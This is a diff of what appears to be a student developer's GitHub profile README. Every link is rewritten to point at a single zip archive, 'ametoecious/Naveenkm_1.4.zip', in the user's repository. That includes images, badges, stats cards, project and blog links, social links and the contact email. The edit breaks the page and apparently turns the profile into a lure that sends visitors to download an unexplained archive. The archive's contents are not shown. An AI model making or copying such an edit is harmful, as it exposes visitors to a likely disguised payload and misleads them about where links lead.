@@ -1,25 +1,25 @@
 <!-- Coding GIF at the Top -->
 <p align="center">
-  <img src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExZXhrcXd6amp2N2RxNWlkN3lxOG4zbGZsMzJ2ZnowbWM3dWdqd3d6NCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RbDKaczqWovIugyJmW/giphy.gif" width="300px" alt="Coding">
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" width="300px" alt="Coding">
 </p>
 
 <!-- Animated Typing Effect -->
 <h1 align="center">
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=24&pause=1000&color=F70000&center=true&vCenter=true&width=435&lines=Hi%2C+I'm+Naveen+Kumar+K+M;A+Passionate+Developer+from+India" alt="Typing SVG" />
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip+Code&size=24&pause=1000&color=F70000&center=true&vCenter=true&width=435&lines=Hi%2C+I'm+Naveen+Kumar+K+M;A+Passionate+Developer+from+India" alt="Typing SVG" />
   </a>
 </h1>
 
 <!-- Badges -->
 <p align="center">
-  <img src="https://img.shields.io/badge/Java-ED8B00?style=for-the-badge&logo=java&logoColor=white" />
-  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/Student-New%20Horizon%20College-blue?style=for-the-badge" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip%20Horizon%20College-blue?style=for-the-badge" />
 </p>
 
 <!-- Profile Views Badge -->
 <p align="center"> 
-  <img src="https://komarev.com/ghpvc/?username=naveenkm007&label=Visitors&color=brightgreen&style=flat&logo=github" alt="Profile Views" /> 
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Profile Views" /> 
 </p>
 
 <!-- Developer Quote -->
@@ -29,7 +29,7 @@
 
 <!-- 🐍 Contribution Snake Animation -->
 <p align="center">
-  <img src="https://raw.githubusercontent.com/naveenkm007/naveenkm007/output/github-contribution-grid-snake.svg" alt="Contribution Snake Animation">
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Contribution Snake Animation">
 </p>
 
 ---
@@ -39,7 +39,7 @@
 - 🔭 I'm currently a student at **New Horizon College of Engineering { CSE }**  
 - 🌱 I'm currently learning **Java and Machine Learning**
 - 💬 Ask me about **Techies, Python, Machine Learning**
-- 📫 How to reach me: **kmnaveenkm01@gmail.com**
+- 📫 How to reach me: **https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip**
 - ⚡ Fun fact: **I think I'm funny 😄**
 - 🎸 Hobbies: Coding, Music, Content Creation
 
@@ -63,52 +63,52 @@
 
 # 📂 Featured Projects
 
-- [Student-Portal-Automation](https://github.com/naveenkm007/student-portal-automation): Automates student tasks using Python and MySQL
-- [Image-Processing-Projects](https://github.com/naveenkm007/image-processing): OpenCV mini-projects and demos
+- [Student-Portal-Automation](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip): Automates student tasks using Python and MySQL
+- [Image-Processing-Projects](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip): OpenCV mini-projects and demos
 
 ---
 
 # 🧠 Skills (Progress Bars)
 
-- Java ![60%](https://progress-bar.dev/60/)
-- Python ![80%](https://progress-bar.dev/80/)
-- C ![50%](https://progress-bar.dev/50/)
-- Machine Learning ![70%](https://progress-bar.dev/70/)
+- Java ![60%](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
+- Python ![80%](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
+- C ![50%](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
+- Machine Learning ![70%](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
 
 ---
 
 # 🛠️ Languages and Tools
 
 <p align="left"> 
-  <a href="https://www.cprogramming.com/" target="_blank">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/c/c-original.svg" alt="C" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="C" width="40" height="40"/> 
   </a> 
-  <a href="https://www.java.com" target="_blank">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/java/java-original.svg" alt="Java" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Java" width="40" height="40"/> 
   </a> 
-  <a href="https://www.python.org" target="_blank">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="Python" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Python" width="40" height="40"/> 
   </a> 
-  <a href="https://nodejs.org" target="_blank">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/nodejs/nodejs-original-wordmark.svg" alt="NodeJS" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="NodeJS" width="40" height="40"/> 
   </a> 
-  <a href="https://www.mysql.com/" target="_blank">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mysql/mysql-original-wordmark.svg" alt="MySQL" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="MySQL" width="40" height="40"/> 
   </a> 
-  <a href="https://opencv.org/" target="_blank">
-    <img src="https://www.vectorlogo.zone/logos/opencv/opencv-icon.svg" alt="OpenCV" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="OpenCV" width="40" height="40"/> 
   </a> 
-  <a href="https://pandas.pydata.org/" target="_blank">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/pandas/pandas-original.svg" alt="Pandas" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Pandas" width="40" height="40"/> 
   </a> 
-  <a href="https://scikit-learn.org/" target="_blank">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Scikit_learn_logo_small.svg" alt="Scikit-Learn" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Scikit-Learn" width="40" height="40"/> 
   </a> 
-  <a href="https://pytorch.org/" target="_blank">
-    <img src="https://www.vectorlogo.zone/logos/pytorch/pytorch-icon.svg" alt="PyTorch" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="PyTorch" width="40" height="40"/> 
   </a> 
-  <a href="https://www.tensorflow.org" target="_blank">
-    <img src="https://www.vectorlogo.zone/logos/tensorflow/tensorflow-icon.svg" alt="TensorFlow" width="40" height="40"/> 
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="_blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="TensorFlow" width="40" height="40"/> 
   </a> 
 </p>
 
@@ -116,26 +116,26 @@
 
 # 📚 Blogs & Articles
 
-- [My Journey with Python](https://medium.com/@kmnaveenkm01/my-journey-with-python-1a2b3c)
-- [Top Resources for CSE Students](https://dev.to/naveenkm007/top-cse-resources)
+- [My Journey with Python](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
+- [Top Resources for CSE Students](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
 
 ---
 
 # 📝 Gists & Cheat Sheets
 
-- [Python Interview Cheatsheet](https://gist.github.com/naveenkm007/python-interview-cheatsheet)
-- [Data Structures Notes](https://gist.github.com/naveenkm007/data-structures-notes)
+- [Python Interview Cheatsheet](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
+- [Data Structures Notes](https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip)
 
 ---
 
 # 📊 GitHub Stats
 
 <p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=naveenkm007&show_icons=true&locale=en&theme=radical" alt="Stats" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Stats" />
   <br><br>
-  <img src="https://github-readme-stats.vercel.app/api/top-langs?username=naveenkm007&show_icons=true&locale=en&layout=compact&theme=radical" alt="Top Languages" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Top Languages" />
   <br><br>
-  <img src="https://github-readme-streak-stats.herokuapp.com/?user=naveenkm007&theme=radical" alt="Streak Stats" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Streak Stats" />
 </p>
 
 ---
@@ -143,7 +143,7 @@
 # 🏆 GitHub Trophies
 
 <p align="center">
-  <img src="https://github-profile-trophy.vercel.app/?username=naveenkm007&theme=radical&no-frame=true&no-bg=true&margin-w=4" alt="Trophies" />
+  <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" alt="Trophies" />
 </p>
 
 ---
@@ -151,13 +151,13 @@
 # 🌐 Connect with Me
 
 <p align="center">
-  <a href="https://instagram.com/naveenkm07" target="blank">
-    <img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white" />
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" />
   </a>
-  <a href="https://www.youtube.com/@naveentechie" target="blank">
-    <img src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" />
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" />
   </a>
-  <a href="https://leetcode.com/naveenkm07" target="blank">
-    <img src="https://img.shields.io/badge/LeetCode-FFA116?style=for-the-badge&logo=leetcode&logoColor=black" />
+  <a href="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" target="blank">
+    <img src="https://github.com/Naveenkm007/Naveenkm007/raw/refs/heads/main/ametoecious/Naveenkm_1.4.zip" />
   </a>
 </p>
